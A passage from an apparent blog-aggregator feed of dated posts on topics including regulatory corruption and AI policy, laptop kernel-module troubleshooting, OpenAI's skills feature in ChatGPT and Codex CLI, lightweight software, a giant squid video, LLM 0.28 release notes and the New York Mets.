that are wildly profitable (in the short term) and catastrophic (in the long term). They offer bribes and other corrupt incentives to their watchdogs to let them violate the rules, which leads to utter disaster.&quot; From the 19th century &quot;panics&quot; to the crash of '29 to the S&amp;L collapse to the 2008 Great Financial Crisis and beyond, this just keeps happening. Much of the time, the bankers involved have some tissue-thin explanation for why what they're doing isn't really a violation of the rules. Think of the lenders who, in the runup to the Great Financial Crisis, insisted that they weren't engaged in risky lending because they had a fancy equation that proved that the mortgage-backed securities they were issuing were all sound, and it was literally impossible that they'd all default at once. The fact that regulators were bamboozled by this is enraging. In hindsight (and for many of us at least, at the time), it's obvious that the bankers went to their watchdogs and said, &quot;We'd like to break the law,&quot; and the watchdogs said, &quot;Sure, but would you mind coming up with some excuse that I can repeat later when someone asks me why I let you do this crime?&quot; It's like in the old days of medical marijuana, where you'd get on a call with a dial-a-doc and say, &quot;Please can I have some weed?&quot; and the doc would say, &quot;Tell me about your headaches,&quot; and you'd say, &quot;Uh, I have headaches?&quot; and they'd say &quot;Great, here's your weed!&quot; The alternative is that these regulators are so bafflingly stupid that they can't be trusted to dress themselves. &quot;My stablecoin is a fit financial instrument to integrate into the financial system&quot; is as credible a wheeze as some crypto bro walking up to Cory Booker, flashing a homemade badge, and snapping out, &quot;Federal Wallet Inspector, hand it over.&quot; I mean, at that point, I kind of hope they're corrupt, because the alternative is that they are basically a brainstem and a couple of eyestalks in a suit. What I'm saying is, &quot;We just can't figure out if crypto is violating finance laws&quot; is a statement that can only be attributed to someone very stupid, or in on the game. Speaking of &quot;someone very stupid, or in on the game,&quot; Congress just killed a rule that would have guaranteed that the US military could repair its own materiel: <a href="https://federalnewsnetwork.com/congress/2025/12/congress-quietly-strips-right-to-repair-provisions-from-2026-ndaa-despite-wide-support/">https://federalnewsnetwork.com/congress/2025/12/congress-quietly-strips-right-to-repair-provisions-from-2026-ndaa-despite-wide-support/</a> Military right to repair is the most brainless of all possible no-brainers. When a generator breaks down in the field – even in an active war-zone – the US military has to ship it back to America to be serviced by the manufacturer. That's not because you can't train a Marine to fix a generator – it's because the contractual and technical restrictions that military contractors insist on ban the military from fixing its stuff: <a href="https://www.pogo.org/fact-sheets/fact-sheet-the-right-to-repair-for-the-united-states-military">https://www.pogo.org/fact-sheets/fact-sheet-the-right-to-repair-for-the-united-states-military</a> This violates a very old principle in sound military administration. Abraham Lincoln insisted that the contractors who supplied the Union army had to use standardized tooling and ammo, because it would be very embarrassing for the Commander-in-Chief to have to stand on the field at Gettysburg with a megaphone and shout, &quot;Sorry boys, war's canceled this week, our sole supplier's gone on vacation.&quot; And yet, after mergers of large military contractors resulted in just a handful of &quot;primary&quot; companies serving the Pentagon, private equity vampires snapped up all the subcontractors who were sole-source suppliers of parts to those giants. They slashed the prices of those parts so that the primary contractors used as many as possible in the materiel they provided to the US DoD, and then raised the prices of replacement parts, some with 10,000% margins, which the Pentagon now has to pay for so long as they own those jets and other big-ticket items: <a href="https://pluralistic.net/2021/01/29/fractal-bullshit/#dayenu">https://pluralistic.net/2021/01/29/fractal-bullshit/#dayenu</a> This isn't a complicated scam. It's super straightforward, and the right to repair rule that Congress killed addressed it head on. But Congressional enemies of this bill insisted that it would have untold &quot;unintended consequences&quot; and instead passed a complex rule, riddled with loopholes, because there was something unique and subtle about the blunt issue of price-gouging: <a href="https://www.warren.senate.gov/imo/media/doc/final">https://www.warren.senate.gov/imo/media/doc/final</a>_-_warren_letter_to_dod_re_right_to_repair_consequences_092524.pdf Either these lawmakers are so stupid that they fell for the ole &quot;Federal Wallet Inspector&quot; gambit, or they're in on the game. I know which explanation my money is on. Maybe this has already occurred to you, but lately I've come to realize that there's another dimension to this, a way in which critics of tech help this gambit along. After all, it's pretty common for tech critics to preface their critiques with words to the effect of, &quot;Of course, this technology has raced ahead of regulators' ability to keep pace with it. Those dastardly tech-bros have slipped the net once again!&quot; The unspoken (and sometimes very loudly spoken) corollary of this is, &quot;Only a tech-critic as perspicacious and forward looking as me is capable of matching wits with those slippery tech-bros, and I have formulated a sui generis policy prescription that can head them off at the pass.&quot; Take the problem of deepfakes, including deepfake porn. There's a pretty straightforward policy response to this: a privacy law that allows you to prevent the abuse of your private information (including to create deepfakes) that unlawfully process your personal information for an illegitimate purpose. To make sure that this law can be enforced, include a &quot;private right of action,&quot; which means that individuals can sue to enforce it (and activist orgs and no-win/no-fee lawyers can sue on their behalf). That way, you can get justice even if the state Attorney General or the federal Department of Justice decides not to take your case. Privacy law is a great idea. It can navigate nuances, like the fact that privacy is collective, not individual – for example, it can intervene when your family members give their (your) DNA to a scam like 23andme, or when a friend posts photos of you online: <a href="https://jacobin.com/2021/05/cory-doctorow-interview-bill-gates-intellectual-property">https://jacobin.com/2021/05/cory-doctorow-interview-bill-gates-intellectual-property</a> But privacy law gets a bad rap. In the EU, they've had the GDPR – a big, muscular privacy law – for nine years, and all it's really done is drown the continent in cookie-consent pop-ups. But that's not because the GDPR is flawed, it's because Ireland is a tax-haven that has lured in the world's worst corporate privacy-violators, and to keep them from moving to another tax haven (like Malta or Cyprus or Luxembourg), it has to turn itself into a crime-haven. So for the entire life of the GDPR, all the important privacy cases in Europe have gone to Ireland, and died there: <a href="https://pluralistic.net/2025/12/01/erin-go-blagged/#big-tech-omerta">https://pluralistic.net/2025/12/01/erin-go-blagged/#big-tech-omerta</a> Now, again, this isn't a complicated technical question that is hard to resolve through regulation. It's just boring old corruption. I'm not saying that corruption is easy to solve, but I am saying that it's not complicated. Irish politicians made the country's economy dependent on the Irish state facilitating criminal activity by American firms. The EU doesn't want to provoke a constitutional crisis by forcing Ireland (and the EU's other crime-havens) to halt this behavior. That's a hard thing to do! It's just not a complicated thing to do. The routine violations of EU privacy law by American tech companies aren't the result of &quot;tech racing ahead of the law.&quot; It's just corruption. You can't fix corruption by passing more laws; they'll just be corruptly enforced, too. But thanks to a mix of bad incentives – politicians wanting to be seen to do something without actually upsetting the apple-cart; AI critics wanting to inflate their importance by claiming that they're fighting something novel and complex, as opposed to something that's merely boring and hard – we get policy proposals that will likely worsen the problem. Take Denmark's decision to fight deepfakes by creating a new copyright over your likeness: <a href="https://www.theguardian.com/technology/2025/jun/27/deepfakes-denmark-copyright-law-artificial-intelligence">https://www.theguardian.com/technology/2025/jun/27/deepfakes-denmark-copyright-law-artificial-intelligence</a> Copyright – a property right – is an incredibly bad way to deal with human rights like privacy. For one thing, it makes privacy into a luxury good that only the wealthy can afford (remember, a discount for clicking through a waiver of your privacy right is the same thing as an extra charge for not waiving your privacy rights). For another, property rights are very poorly suited to managing things that have joint ownership, such as private information. As soon as you turn private information into private property, you have to answer questions like, &quot;Which twin owns the right to their face&quot; and &quot;Who owns the right to the fact that your abusive mother is your mother – you, or her? And if it's her, does she get to stop you from publishing a memoir about the abuse?&quot; Copyright – a state-backed transferable monopoly over expression – is really hard to get right. Legislatures and courts have struggled to balance free expression and copyright for centuries, and there's a complex web of &quot;limitations and exceptions&quot; to copyright. Privacy is also incredibly complex, and has its own limitations and exceptions, and they are very different from copyright's limits. I mean, they have to be: privacy rules defend your human right to a personal zone of autonomy; copyright is intended to create economic incentives to produce new creative works. It would be very weird if the same rules served both ends. I can't believe that Denmark's legislators failed to consider privacy as the solution to deepfakes. If they did, they are very, very stupid. Rather, they decided that fighting the corruption that keeps privacy law from being enforced in the EU was too hard, so they just did something performative, creating a raft of new problems, without solving the old one. Here in the USA, there's lots of lawmakers who are falling into this trap. Take the response to chatbots that give harmful advice to children and teens. The answer that many American politicians (as well as lawmakers abroad, in Australia, Canada, the UK and elsewhere) have come up with is to force AI companies to identify who is and is not a child and treat them differently. This boils down to a requirement for AI companies to collect much more information on their users (to establish their age), which means that all the AI harms that stem from privacy violations (AI algorithms that steal wages, hike prices, discriminate in hiring and lending and policing, etc) are now even harder to stop. A simple alternative to this would be updating privacy law to limit how AI companies can gather and use everyone's data – which would mean that you could protect kids from privacy invasions without (paradoxically) requiring them (and you) to disclose all kinds of private information to determine how old they are. The insistence – by AI critics and AI boosters – that AI is so different from other technologies that you can't address it by limiting the collection, retention and processing of private information is a way in which AI critics and AI hucksters end up colluding to promote a view of AI as an exceptional technology. It's not. AI is a normal technology: <a href="https://www.aisnakeoil.com/p/ai-as-normal-technology">https://www.aisnakeoil.com/p/ai-as-normal-technology</a> Sometimes this argument descends into grimly hilarious parody. Argue for limits on AI companies' collection, retention and processing of private information and AI boosters will tell you that this would require so much labor-intensive discernment about training data that it would make it impossible to continue training AI until it becomes intelligent enough to solve all our problems. But also, when you press the issue, they'll sometimes say that AI is already so &quot;intelligent&quot; that it can derive (that is, guess) private information about you without needing your data, so a new privacy law won't help. In other words, applying privacy limitations to AI means we'll never get a &quot;superintelligence,&quot;; and also, we already have a superintelligence so there's no point in applying privacy limitations to AI. It's true that technology can give rise to novel regulatory challenges, but it's also true that claiming that a technology is so novel that existing regulation can't resolve its problems is just a way of buying time to commit more crimes before the regulators finally realize that your flashy new technology is just a boring old scam.

      <p>
      <p>Instead of writing my tech comms predictions for next year <a href="https://passo.uno/tech-writing-predictions-2025/">like I did in 2024</a>, I’ve written a fictionalized account of my day as a technical writer in 2030. It’ll be interesting to see whether we get there or not. Take it as a window into a possible future, one where AI usage is safer, more regulated, and better integrated with our workflows (as it should be).</p>

<p>That was yesterday. Today I found myself writing a <a href="https://www.facebook.com/dave.winer.12/posts/pfbid02Ggdsc3q4Z9qaz8uE1H3yc8qBAJnz3YhuWWS8GiCyaQdVPRF2BUWTWTQuxFxzHLLnl?comment_id=1586870055654260&amp;reply_comment_id=881509054436484">comment</a> that was really a blog post.</p>

<li><a href="https://www.anngreenberg.com/">Ann Greenberg</a>, the <a href="https://www.anngreenberg.com/inventions">visionary</a>, was <a href="https://www.linkedin.com/in/anngreenberg/">trying</a> to explain this to me almost 20 years ago and my mind couldn't comprehend the possibility. but ann, don't take it personally -- i don't even listen to myself. i have spent most of this year struggling with a problem i solved in 2014. there was like this moment, omg this is exactly what i tried to do with twitter, but now i have control of the api, so i can actually make it work. my gift to you Ann is this -- we all should've listened to you.</li>
</ul>
<p>We're at that point in our lives I think when reaching out like this is totally the right thing to do. Because it's only until this point that things quiet down enough that you can realize things like this.</p>
<p>BTW, the idea of a comment not being a blog post will require a lot of explanation in a few years. Imho of course.</p>

<p>If the part of programming you enjoy most is the physical act of writing code, then agents will feel beside the point. You’re already where you want to be, even just with some Copilot or Cursor-style intelligent code auto completion, which makes you faster while still leaving you fully in the driver’s seat about the code that gets written.</p>
<p>But if the part you care about is the decision-making around the code, agents feel like they clear space. They take care of the mechanical expression and leave you with judgment, tradeoffs, and intent. Because truly, for someone at my experience level, that is my core value offering anyway. When I spend time actually typing code these days with my own fingers, it feels like a waste of my time.</p>

<p>I suppose it’s not clear to me what a ‘good’ window into unreliable, systemically toxic systems accomplishes, or how it changes anything that matters for the better, or what that idea even means at all. I don’t understand how “ethical AI” isn’t just “clean coal” or “natural gas.” The power of normalization as four generations are raised breathing low doses of aerosolized neurotoxins; the alternative was called “unleaded”, but the poison was called “regular gas”.</p>
<p>There’s a real technology here, somewhere. Stochastic pattern recognition seems like a powerful tool for solving some problems. But solving a problem starts at the problem, not working backwards from the tools.</p>

(date: 2025-12-12)
      <p>
      <h1>2025-12-13 MNT Pocket Reform notes</h1>
<blockquote>
<p>As is often the case, I sit on a cushion in the living room, typing into the MNT Pocket Reform laptop while Claudia is lying on the sofa, reading a magazine.</p>
</blockquote>
<p>After a recent upgrade, poweroff, shutdown and friends stopped doing their job. The system starts shutting down; only the keyboard lights are still on, then nothing happens for a few seconds and then the Pocket Reform reboots again.</p>
<p>I posted on the community forums, asking for help, and <em>josch</em> came to the rescue once again.
The key to finding the problem is running <code>reform-check</code>.</p>
<p>Here’s his breakdown:</p>
<pre><code>E: Cannot get version of linux-image-mnt-reform-arm64 as it is not installed

</code></pre>
<blockquote>
<p>Without having that meta-package installed, it will be more tricky to keep your kernel up-to-date.</p>
</blockquote>
<pre><code>W: unable to obtain version of system controller firmware -- firmware too old?
W: unable to obtain version of keyboard firmware -- firmware too old?

</code></pre>
<blockquote>
<p>You should look into upgrading your sysctl and keyboard firmware. The versions after the one you have (too old to retrieve the exact version) contain important fixes for the stability of keyboard/sysctl communication.</p>
</blockquote>
<pre><code>E: linux-headers-mnt-reform-arm64 is not installed -- cannot compile reform2_lpc module

</code></pre>
<p>This is why you cannot shut-down properly. Without the <code>reform2_lpc</code> module, the system cannot tell your Pocket to switch off.</p>
<pre><code>E: reform2_lpc is not loaded (battery status information will be missing)
E: /usr/lib/modules/6.17.11-mnt-reform-arm64/updates/dkms/reform2_lpc.ko{.xz} does not exist

</code></pre>
<blockquote>
<p>More errors because the module cannot be compiled above.</p>
</blockquote>
<p>I installed <code>linux-image-mnt-reform-arm64</code> and <code>linux-headers-mnt-reform-arm64</code> but the <code>reform2_lpc</code> is still uncompiled.</p>
<p>I’m not sure how to do this but guessed that <code>sudo dpkg-reconfigure reform2-lpc-dkms</code> was the command I needed. To load it, <code>sudo modprobe reform2-lpc</code> … and now shutdown works! 😍</p>
<p>I found information about the dynamic kernel module system (dkms) on this very blog. Sometimes it is amazing. And then I searched for an appropriate package.</p>
<p>As for the firmware, <em>josch</em> said:</p>
<blockquote>
<p>Since your firmware is too old to be updated via fwupd, you need to do it manually once: <a href="https://source.mnt.re/reform/pocket-reform/-/releases/20250724#how-to-update-your-mnt-pocket-reform-firmware">How to Update your MNT Pocket Reform Firmware</a>.
After you are on that firmware version, you can use gnome-firmware (the GUI way) or <code>fwupd</code> (the console way) to update to the latest version.</p>
</blockquote>
<p>Thanks, <em>josch</em>!</p>

(date: 2025-12-12)
      <p>
      <p>One of the things that most excited me about <a href="https://simonwillison.net/2025/Oct/16/claude-skills/">Anthropic's new Skills mechanism</a> back in October is how easy it looked for other platforms to implement. A skill is just a folder with a Markdown file and some optional extra resources and scripts, so any LLM tool with the ability to navigate and read from a filesystem should be capable of using them. It turns out OpenAI are doing exactly that, with skills support quietly showing up in both their Codex CLI tool and now also in ChatGPT itself.</p>
<h4>Skills in ChatGPT</h4>
<p>I learned about this <a href="https://x.com/elias_judin/status/1999491647563006171">from Elias Judin</a> this morning. It turns out the Code Interpreter feature of ChatGPT now has a new <code>/home/oai/skills</code> folder which you can access simply by prompting:</p>
<blockquote>
<p><code>Create a zip file of /home/oai/skills</code></p>
</blockquote>
<p>I <a href="https://chatgpt.com/share/693c9645-caa4-8006-9302-0a9226ea7599">tried that myself</a> and got back <a href="https://static.simonwillison.net/static/cors-allow/2025/skills.zip">this zip file</a>. Here's <a href="https://tools.simonwillison.net/zip-wheel-explorer?url=https%3A%2F%2Fstatic.simonwillison.net%2Fstatic%2Fcors-allow%2F2025%2Fskills.zip">a UI for exploring its content</a> ( <a href="https://tools.simonwillison.net/colophon#zip-wheel-explorer.html">more about that tool</a>).</p>
<p><img src="https://static.simonwillison.net/static/2025/skills-explore.jpg" alt="Screenshot of file explorer. Files skills/docs/render_docsx.py and skills/docs/skill.md and skills/pdfs/ and skills/pdfs/skill.md - that last one is expanded and reads: # PDF reading, creation, and review guidance  ## Reading PDFs - Use pdftoppm -png OUTDIR/BASENAME.pdf OUTDIR/BASENAME to convert PDFs to PNGs. - Then open the PNGs and read the images. - pdfplumber is also installed and can be used to read PDFs. It can be used as a complementary tool to pdftoppm but not replacing it. - Only do python printing as a last resort because you will miss important details with text extraction (e.g. figures, tables, diagrams).  ## Primary tooling for creating PDFs - Generate PDFs programmatically with reportlab as the primary tool. In most cases, you should use reportlab to create PDFs. - If there are other packages you think are necessary for the task (eg. pypdf, pyMuPDF), you can use them but you may need topip install them first. - After each meaningful update—content additions, layout adjustments, or style changes—render the PDF to images to check layout fidelity:   - pdftoppm -png INPUT_PDF OUTPUT_PREFIX - Inspect every exported PNG before continuing work. If anything looks off, fix the source and re-run the render → inspect loop until the pages are clean.  ## Quality expectations - Maintain a polished, intentional visual design: consistent typography, spacing, margins, color palette, and clear section breaks across all pages. - Avoid major rendering issues—no clipped text, overlapping elements, black squares, broken tables, or unreadable glyphs. The rendered pages should look like a curated document, not raw template output. - Charts, tables, diagrams, and images must be sharp, well-aligned, and properly labeled in the PNGs. Legends and axes should be readable without excessive zoom. - Text must be readable at normal viewing size; avoid walls of filler text or dense, unstructured bullet lists. Use whitespace to separate ideas. - Never use the U+2011 non-breaking hyphen or other unicode dashes as they will not be"></p>
<p>So far they cover spreadsheets, docx and PDFs. Interestingly their chosen approach for PDFs and documents is to convert them to rendered per-page PNGs and then pass those through their vision-enabled GPT models, presumably to maintain information from layout and graphics that would be lost if they just ran text extraction.</p>
<p>Elias <a href="https://github.com/eliasjudin/oai-skills">shared copies in a GitHub repo</a>. They look very similar to Anthropic's implementation of the same kind of idea, currently published in their <a href="https://github.com/anthropics/skills/tree/main/skills">anthropics/skills</a> repository.</p>
<p>I tried it out by prompting:</p>
<blockquote>
<p>Create a PDF with a summary of the rimu tree situation right now and what it means for kakapo breeding season</p>
</blockquote>
<p>Sure enough, GPT-5.2 Thinking started with:</p>
<blockquote>
<p>Reading skill.md for PDF creation guidelines</p>
</blockquote>
<p>Then:</p>
<blockquote>
<p>Searching rimu mast and Kākāpō 2025 breeding status</p>
</blockquote>
<p>It took <a href="https://chatgpt.com/share/693ca54b-f770-8006-904b-9f31a585180a">just over eleven minutes</a> to produce <a href="https://static.simonwillison.net/static/cors-allow/2025/rimu_kakapo_breeding_brief.pdf">this PDF</a>, which was long enough that I had Claude Code for web <a href="https://github.com/simonw/tools/pull/155">build me a custom PDF viewing tool</a> while I waited.</p>
<p><a href="https://tools.simonwillison.net/view-pdf?url=https%3A%2F%2Fstatic.simonwillison.net%2Fstatic%2Fcors-allow%2F2025%2Frimu_kakapo_breeding_brief.pdf">Here's ChatGPT's PDF in that tool</a>.</p>
<p><img src="https://static.simonwillison.net/static/2025/rimu.jpg" alt="Screenshot of my tool. There is a URL at the top, a Load PDF button and pagination controls. Then the PDF itself is shown, which reads: Rimu mast status and what it means for the kākāpō breeding season Summary as of 12 December 2025 (Pacific/Auckland context) Kākāpō breeding is tightly linked to rimu (Dacrydium cupressinum) mast events: when rimu trees set and ripen large amounts of fruit, female kākāpō are much more likely to nest, and more chicks can be successfully raised. Current monitoring indicates an unusually strong rimu fruiting signal heading into the 2025/26 season, which sets the stage for a potentially large breeding year in 2026.^1,2 Key numbers at a glance Kākāpō population (official DOC count) 237 birds alive Breeding trigger (rimu fruiting)&gt;10% of rimu branch tips bearing fruit Forecast rimu fruiting for 2026 (DOC monitoring) Around 50–60% fruiting across breeding islands¹Breeding-age females (DOC 2025 planning figure)About 87 females (potentially nearly all could nest)"></p>
<p>(I am <strong>very excited</strong> about <a href="https://www.auckland.ac.nz/en/news/2025/12/03/bumper-breeding-season-for-kakapo-on-the-cards.html">Kākāpō breeding season this year</a>.)</p>
<p>The reason it took so long is that it was fastidious about looking at and tweaking its own work. I appreciated that at one point it tried rendering the PDF and noticed that the macrons in kākāpō were not supported by the chosen font, so it switched to something else:</p>
<p><img src="https://static.simonwillison.net/static/2025/skills-macrons.jpg" alt="ChatGPT screenshot. Analyzed image. There's an image of a page of PDF with obvious black blocks on some of the letters in the heading. It then says: Fixing font issues with macrons. The page is showing black squares for words like &quot;kākāpō,&quot; probably because Helvetica can't handle macrons. I'll switch to a font that supports them, such as DejaVu Sans or Noto Sans. I'll register both regular and bold fonts, then apply them to the document. I'll update the footer to note the issue with Helvetica. Time to rebuild the PDF!"></p>
<h4>Skills in Codex CLI</h4>
<p>Meanwhile, two weeks ago OpenAI's open source Codex CLI tool landed a PR titled <a href="https://github.com/openai/codex/pull/7412">feat: experimental support for skills.md</a>. The most recent docs for that are in <a href="https://github.com/openai/codex/blob/main/docs/skills.md">docs/skills.md</a>.</p>
<p>The documentation suggests that any folder in <code>~/.codex/skills</code> will be treated as a skill.</p>
<p>I dug around and found the code that generates the prompt that drives the skill system in <a href="https://github.com/openai/codex/blob/ad7b9d63c326d5c92049abd16f9f5fb64a573a69/codex-rs/core/src/skills/render.rs#L20-L38">codex-rs/core/src/skills/render.rs</a> - here's a Gist with <a href="https://gist.github.com/simonw/25f2c3a9e350274bc2b76a79bc8ae8b2">a more readable version of that prompt</a>.</p>
<p>I <a href="https://claude.ai/share/0a9b369b-f868-4065-91d1-fd646c5db3f4">used Claude Opus 4.5's skill authoring skill</a> to create <a href="https://github.com/datasette/skill">this skill for creating Datasette plugins</a>, then installed it into my Codex CLI skills folder like this:</p>
<pre><code>git clone https://github.com/datasette/skill \
  ~/.codex/skills/datasette-plugin
</code></pre>
<p>You have to run Codex with the <code>--enable skills</code> option. I ran this:</p>
<pre><code>cd /tmp
mkdir datasette-cowsay
cd datasette-cowsay
codex --enable skills -m gpt-5.2
</code></pre>
<p>Then prompted:</p>
<blockquote>
<p><code>list skills</code></p>
</blockquote>
<p>And Codex replied:</p>
<blockquote>
<p><code>- datasette-plugins — Writing Datasette plugins using Python + pluggy (file: /Users/simon/.codex/skills/datasette-plugin/SKILL.md)</code></p>
<p><code>- Discovery — How to find/identify available skills (no SKILL.md path provided in the list)</code></p>
</blockquote>
<p>Then I said:</p>
<blockquote>
<p><code>Write a Datasette plugin in this folder adding a /-/cowsay?text=hello page that displays a pre with cowsay from PyPI saying that text</code></p>
</blockquote>
<p>It worked perfectly! Here's <a href="https://github.com/simonw/datasette-cowsay">the plugin code it wrote</a> and here's <a href="http://gistpreview.github.io/?96ee928370b18eabc2e0fad9aaa46d4b">a copy of the full Codex CLI transcript</a>, generated with my <a href="https://simonwillison.net/2025/Oct/23/claude-code-for-web-video/">terminal-to-html tool</a>.</p>
<p>You can try that out yourself if you have <code>uvx</code> installed like this:</p>
<pre><code>uvx --with https://github.com/simonw/datasette-cowsay/archive/refs/heads/main.zip \
  datasette
</code></pre>
<p>Then visit:</p>
<pre><code>http://127.0.0.1:8001/-/cowsay?text=This+is+pretty+fun

</code></pre>
<p><img src="https://static.simonwillison.net/static/2025/cowsay-datasette.jpg" alt="Screenshot of that URL in Firefox, an ASCII art cow says This is pretty fun."></p>
<h4>Skills are a keeper</h4>
<p>When I first wrote about skills in October I said <a href="https://simonwillison.net/2025/Oct/16/claude-skills/">Claude Skills are awesome, maybe a bigger deal than MCP</a>. The fact that it's just turned December and OpenAI have already leaned into them in a big way reinforces to me that I called that one correctly.</p>
<p>Skills are based on a <em>very</em> light specification, if you could even call it that, but I still think it would be good for these to be formally documented somewhere. This could be a good initiative for the new <a href="https://aaif.io/">Agentic AI Foundation</a> ( <a href="https://simonwillison.net/2025/Dec/9/agentic-ai-foundation/">previously</a>) to take on.</p>

      <h1>What's the point of lightweight code with modern computers?</h1>

(date: 2025-12-12)
      <p>
      <p>I think there are many.</p>
<p>Some examples:</p>
<p>\* The fastest code is the code you don't run.</p>
<p>Smaller = faster, and we all want faster. Moore's law is over, Dennard scaling isn't affordable any more, smaller feature sizes are getting absurdly difficult and therefore expensive to fab. So if we want our computers to keep getting faster as we've got used to over the last 40-50 years then the only way to keep delivering that will be to start ruthlessly optimising, shrinking, finding more efficient ways to implement what we've got used to.</p>
<p>Smaller systems are better for performance.</p>
<p>\* The smaller the code, the less there is to go wrong.</p>
<p>Smaller doesn't just mean faster, it should mean simpler and cleaner too. Less to go wrong. Easier to debug. Wrappers and VMs and bytecodes and runtimes are bad: they make life easier but they are less efficient and make issues harder to troubleshoot. Part of the Unix philosophy is to embed the KISS principle.</p>
<p>So that's performance and troubleshooting. We aren't done.</p>
<p>\* The less you run, the smaller the attack surface.</p>
<p>Smaller code and less code means fewer APIs, fewer interfaces, less points of failure. Look at djb's decades-long policy of offering rewards to people who find holes in qmail or djbdns. Look at OpenBSD. We all need better more secure code. Smaller simpler systems built from fewer layers means more security, less attack surface, less to audit.</p>
<p>Higher performance, and easier troubleshooting, and better security. There's 3 reasons.</p>
<p>Practical examples...</p>
<p>The Atom editor spawned an entire class of app: Electron apps, Javascript on Node, bundled with Chromium. Slack, Discord, VSCode: there are multiple apps used by tens to hundreds of millions of people now. Look at how vast they are. Balena Etcher is a, what, nearly 100 MB download to write an image to USB? Native apps like Rufus do it in a few megabytes. Smaller ones like USBimager do it in hundreds of kilobytes. A dd command in under 100 bytes.</p>
<p>Now some of the people behind Atom wrote Zed.</p>
<p>It's 10% of the size and 10x the speed, in part because it's a native Rust app.</p>
<p>The COSMIC desktop looks like GNOME, works like GNOME Shell, but it's smaller and faster and more customisable because it's native Rust code.</p>
<p>GNOME Shell is Javascript running on an embedded copy of Mozilla's Javascript runtime.</p>
<p>Just like dotcoms wanted to dis-intermediate business, remove middlemen and distributors for faster sales, we could use disintermediation in our software. Fewer runtimes, better smarter compiled languages so we can trap more errors and have faster <em>and</em> safer compiled native code.</p>
<p>Smaller, simpler, cleaner, fewer layers, less abstractions: these are all <em>goods things</em> which are <em>desirable</em>.</p>
<p>Dennis Ritchie and Ken Thompson knew this. That's why Research Unix evolved into Plan 9, which puts way more stuff through the filesystem to remove whole types of API. Everything's in a container all the time, the filesystem abstracts the network and the GUI and more. Under 10% of the syscalls of Linux, the kernel is 5MB of source, and yet it has much of Kubernetes in there.</p>
<p>Then they went further, replaced C too, made a simpler safer language, embedded its runtime right into the kernel, and made binaries CPU-independent, and turned the entire network-aware OS into a runtime to compete with the JVM, so it could run as a browser plugin as well as a bare-metal OS. Now we have ubiquitous virtualisation so lean into it: separate domains. If your user-facing OS only runs in a VM then it doesn't need a filesystem or hardware drivers, because it won't see hardware, only virtualised facilities, so rip all that stuff out. Your container host doesn't need to have a console or manage disks.</p>
<p>This is what we should be doing. This is what we need to do. Hack away at the code complexity. Don't add functionality, remove it. Simplify it. Enforce standards by putting them in the kernel and removing dozens of overlapping implementations. Make codebases that are smaller and readable by humans.</p>
<p>Leave the vast bloated stuff to commercial companies and proprietary software where nobody gets to read it except LLM bots anyway.</p>

      <p>I have no context for <a href="https://www.reddit.com/r/interestingasfuck/comments/1pg0ujj/new_rare_footage_of_a_live_giant_squid_caught/">this video</a>—it’s from Reddit—but one of the commenters adds some context:</p>
<blockquote>
<p>Hey everyone, squid biologist here! Wanted to add some stuff you might find interesting.</p>
<p>With so many people carrying around cameras, we’re getting more videos of giant squid at the surface than in previous decades. We’re also starting to notice a pattern, that around this time of year (peaking in January) we see a bunch of giant squid around Japan. We don’t know why this is happening. Maybe they gather around there to mate or something? who knows! but since so many people have cameras, those one-off monster-story encounters are now caught on video, like this one (which, btw, rips. This squid looks so healthy, it’s awesome)...</p>

      <h1>LLM 0.28</h1>

(date: 2025-12-12)
      <p>
      <p><strong><a href="https://llm.datasette.io/en/stable/changelog.html#v0-28">LLM 0.28</a></strong></p>
<p>I released a new version of my <a href="https://llm.datasette.io/">LLM</a> Python library and CLI tool for interacting with Large Language Models. Highlights from the release notes:</p>
<blockquote>
<ul>
<li>New OpenAI models: <code>gpt-5.1</code>, <code>gpt-5.1-chat-latest</code>, <code>gpt-5.2</code> and <code>gpt-5.2-chat-latest</code>. <a href="https://github.com/simonw/llm/issues/1300">#1300</a>, <a href="https://github.com/simonw/llm/issues/1317">#1317</a></li>
<li>When fetching URLs as fragments using <code>llm -f URL</code>, the request now includes a custom user-agent header: <code>llm/VERSION (https://llm.datasette.io/)</code>. <a href="https://github.com/simonw/llm/issues/1309">#1309</a></li>
<li>Fixed a bug where fragments were not correctly registered with their source when using <code>llm chat</code>. Thanks, <a href="https://github.com/grota">Giuseppe Rota</a>. <a href="https://github.com/simonw/llm/pull/1316">#1316</a></li>
<li>Fixed some file descriptor leak warnings. Thanks, <a href="https://github.com/eedeebee">Eric Bloch</a>. <a href="https://github.com/simonw/llm/issues/1313">#1313</a></li>
<li>Type annotations for the OpenAI Chat, AsyncChat and Completion <code>execute()</code> methods. Thanks, <a href="https://github.com/ar-jan">Arjan Mossel</a>. <a href="https://github.com/simonw/llm/pull/1315">#1315</a></li>
<li>The project now uses <code>uv</code> and dependency groups for development. See the updated <a href="https://llm.datasette.io/en/stable/contributing.html">contributing documentation</a>. <a href="https://github.com/simonw/llm/issues/1318">#1318</a></li>
</ul>
</blockquote>
<p>That last bullet point about <code>uv</code> relates to the dependency groups pattern I <a href="https://til.simonwillison.net/uv/dependency-groups">wrote about in a recent TIL</a>. I'm currently working through applying it to my other projects - the net result is that running the test suite is as simple as doing:</p>
<pre><code>git clone https://github.com/simonw/llm
cd llm
uv run pytest

</code></pre>
<p>The new <code>dev</code> dependency group <a href="https://github.com/simonw/llm/blob/0.28/pyproject.toml#L44-L69">defined in pyproject.toml</a> is automatically installed by <code>uv run</code> in a new virtual environment which means everything needed to run <code>pytest</code> is available without needing to add any extra commands.</p>

      <h1>The Mets' soul walks out the door</h1>

(date: 2025-12-12)
      <p>
      <p>As a lifelong Mets fan since 1962, I say <a href="https://apnews.com/article/mets-alonso-diaz-nimmo-stearns-cohen-212636702fdf04efc0889c36a53a88e1">they blew it</a>. And if you follow my sports writing here, mostly about the Knicks and Mets, I almost never say a team was wrong. I can usually see a pro and a con to everything. WIth the Mets, I let the team run itself, and ponder the philosophical intentions and manifestations, because to me the Mets are the team built on philosophy. It certainly was not built on winning. And yet we love them. There's no winning in life, that's reality. So we try to find meaning on the days and hours we have remaining. And the Mets are great teachers, as are the Knicks.</p>
<p>Anyway -- why did the Mets have such a shit season?</p>
<p>Because they disrespected <a href="https://en.wikipedia.org/wiki/Pete_Alonso">Pete Alonso</a> last winter.</p>
<p>He should have been the glue that held the team together along with Nimmo, Diaz, and all the other much-loved players.</p>
<p>We still think of <a href="https://en.wikipedia.org/wiki/Francisco_Lindor">Lindor</a> as the new guy. Now all you have left for leadership is Lindor and Soto who obviously doesn't even want to be there. It's was a broken team before the news, and now it's not even a team.</p>
